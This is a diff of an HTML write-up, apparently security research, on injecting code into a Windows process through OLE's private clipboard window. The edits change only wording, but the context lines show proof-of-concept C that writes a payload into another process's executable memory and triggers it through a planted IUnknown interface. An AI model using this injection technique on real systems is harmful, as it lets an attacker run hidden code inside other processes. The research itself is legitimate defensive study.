@@ -6,7 +6,7 @@
 
 <h3>Finding Windows</h3>
 
-<p>Private clipboards registered by OLE32.dll can't be found by <code>EnumWindows</code> because they're message-only windows. <code>FindWindowEx</code> with <code>HWND_MESSAGE</code> will find them and is used for the PoC. Another approach requires reading the <code>ReservedForOle</code> value for each Thread Environment Block in a process. <code>ReservedForOle</code> points to a <a href="https://github.com/dotnet/coreclr/blob/master/src/vm/oletls.h">SOleTlsData</a> structure that contains a window handle for <code>CLIPBRDWNDCLASS</code>. To find private clipboards via the TEB, open a process and enumerate threads. Then perform the following steps:</p>
+<p>Private clipboards registered by OLE32.dll can't be found by <code>EnumWindows</code> because they're message-only windows. <code>FindWindowEx</code> with <code>HWND_MESSAGE</code> will find them and is used for the PoC. Another approach requires reading the <code>ReservedForOle</code> value of each Thread Environment Block in a process. <code>ReservedForOle</code> points to a <a href="https://github.com/dotnet/coreclr/blob/master/src/vm/oletls.h">SOleTlsData</a> structure that contains a window handle for <code>CLIPBRDWNDCLASS</code>. To find private clipboards via the TEB, open a process and enumerate threads. Then perform the following steps:</p>
 
 <ul>
 <li>Open the thread</li>
@@ -43,7 +43,8 @@
     <span style='color:#603000; '>LPVOID</span>     cs<span style='color:#808030; '>,</span> ds<span style='color:#800080; '>;</span>
     <span style='color:#603000; '>SIZE_T</span>     wr<span style='color:#800080; '>;</span>
     
-    <span style='color:#696969; '>// 1. Find a private clipboard, obtain the process id and open it</span>
+    <span style='color:#696969; '>// 1. Find a private clipboard.</span>
+    <span style='color:#696969; '>//    Obtain the process id and open it</span>
     hw <span style='color:#808030; '>=</span> <span style='color:#400000; '>FindWindowEx</span><span style='color:#808030; '>(</span>HWND_MESSAGE<span style='color:#808030; '>,</span> <span style='color:#7d0045; '>NULL</span><span style='color:#808030; '>,</span> <span style='color:#800000; '>L"</span><span style='color:#0000e6; '>CLIPBRDWNDCLASS</span><span style='color:#800000; '>"</span><span style='color:#808030; '>,</span> <span style='color:#7d0045; '>NULL</span><span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
     <span style='color:#400000; '>GetWindowThreadProcessId</span><span style='color:#808030; '>(</span>hw<span style='color:#808030; '>,</span> <span style='color:#808030; '>&amp;</span>id<span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
     hp <span style='color:#808030; '>=</span> <span style='color:#400000; '>OpenProcess</span><span style='color:#808030; '>(</span><span style='color:#7d0045; '>PROCESS_ALL_ACCESS</span><span style='color:#808030; '>,</span> FALSE<span style='color:#808030; '>,</span> id<span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
@@ -53,7 +54,8 @@
         MEM_RESERVE <span style='color:#808030; '>|</span> MEM_COMMIT<span style='color:#808030; '>,</span> PAGE_EXECUTE_READWRITE<span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
     <span style='color:#400000; '>WriteProcessMemory</span><span style='color:#808030; '>(</span>hp<span style='color:#808030; '>,</span> cs<span style='color:#808030; '>,</span> payload<span style='color:#808030; '>,</span> payloadSize<span style='color:#808030; '>,</span> <span style='color:#808030; '>&amp;</span>wr<span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
     
-    <span style='color:#696969; '>// 3. Allocate RW memory in process, initialize and write IUnknown interface</span>
+    <span style='color:#696969; '>// 3. Allocate RW memory in process.</span>
+    <span style='color:#696969; '>//    Initialize and write IUnknown interface</span>
     ds <span style='color:#808030; '>=</span> <span style='color:#400000; '>VirtualAllocEx</span><span style='color:#808030; '>(</span>hp<span style='color:#808030; '>,</span> <span style='color:#7d0045; '>NULL</span><span style='color:#808030; '>,</span> <span style='color:#800000; font-weight:bold; '>sizeof</span><span style='color:#808030; '>(</span>IUnknown_t<span style='color:#808030; '>)</span><span style='color:#808030; '>,</span>
         MEM_RESERVE <span style='color:#808030; '>|</span> MEM_COMMIT<span style='color:#808030; '>,</span> PAGE_READWRITE<span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
     iu<span style='color:#808030; '>.</span>lpVtbl  <span style='color:#808030; '>=</span> <span style='color:#808030; '>(</span><span style='color:#603000; '>ULONG_PTR</span><span style='color:#808030; '>)</span>ds <span style='color:#808030; '>+</span> <span style='color:#800000; font-weight:bold; '>sizeof</span><span style='color:#808030; '>(</span><span style='color:#603000; '>ULONG_PTR</span><span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
@@ -64,7 +66,7 @@
     <span style='color:#400000; '>SetProp</span><span style='color:#808030; '>(</span>hw<span style='color:#808030; '>,</span> <span style='color:#800000; '>L"</span><span style='color:#0000e6; '>ClipboardDataObjectInterface</span><span style='color:#800000; '>"</span><span style='color:#808030; '>,</span> ds<span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
     <span style='color:#400000; '>PostMessage</span><span style='color:#808030; '>(</span>hw<span style='color:#808030; '>,</span> <span style='color:#7d0045; '>WM_DESTROYCLIPBOARD</span><span style='color:#808030; '>,</span> <span style='color:#008c00; '>0</span><span style='color:#808030; '>,</span> <span style='color:#008c00; '>0</span><span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
     
-    <span style='color:#696969; '>// 5. Release memory for code and data, close process</span>
+    <span style='color:#696969; '>// 5. Release memory for code and data</span>
     <span style='color:#400000; '>VirtualFreeEx</span><span style='color:#808030; '>(</span>hp<span style='color:#808030; '>,</span> cs<span style='color:#808030; '>,</span> <span style='color:#008c00; '>0</span><span style='color:#808030; '>,</span> MEM_DECOMMIT <span style='color:#808030; '>|</span> MEM_RELEASE<span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
     <span style='color:#400000; '>VirtualFreeEx</span><span style='color:#808030; '>(</span>hp<span style='color:#808030; '>,</span> ds<span style='color:#808030; '>,</span> <span style='color:#008c00; '>0</span><span style='color:#808030; '>,</span> MEM_DECOMMIT <span style='color:#808030; '>|</span> MEM_RELEASE<span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
     <span style='color:#400000; '>CloseHandle</span><span style='color:#808030; '>(</span>hp<span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
